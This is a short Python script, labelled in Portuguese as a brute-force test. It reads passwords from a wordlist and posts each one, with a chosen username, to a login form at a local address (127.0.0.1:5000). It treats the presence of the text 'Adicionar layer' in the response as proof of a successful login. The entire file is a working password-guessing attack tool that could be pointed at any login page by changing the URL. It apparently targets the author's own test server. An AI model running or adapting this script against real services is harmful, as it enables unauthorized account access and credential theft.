import requests
import time
import os
print("------- Brute Force teste -------")
usuario = input("Usuário: ")
wordlist = open(".\wordlist.txt", "r").readlines()
wordlist = [x.replace("\n", "") for x in wordlist]

host = "http://127.0.0.1:5000/login"

# Payload
for senha in wordlist:
    login_data = {
        "nome": usuario,
        "password": senha}
    
    os.system("clear || cls")
    print(f"Testando - {senha}")
    
    response = requests.post("http://127.0.0.1:5000/login", data=login_data).text
    if "Adicionar layer" not in response:
        os.system("clear || cls")
        print('Senha não encontrada \n')
    else:
        os.system("clear || cls")
        print(f"\n\033[32m[+]\033[0;0m {host}")
        print(f"\033[32m[+]\033[0;0m Usuário - \033[32m{usuario}\033[0;0m \n\033[32m[+]\033[0;0m Senha encontrada - \033[32m{senha}\033[0;0m")
        print("\n\n\n")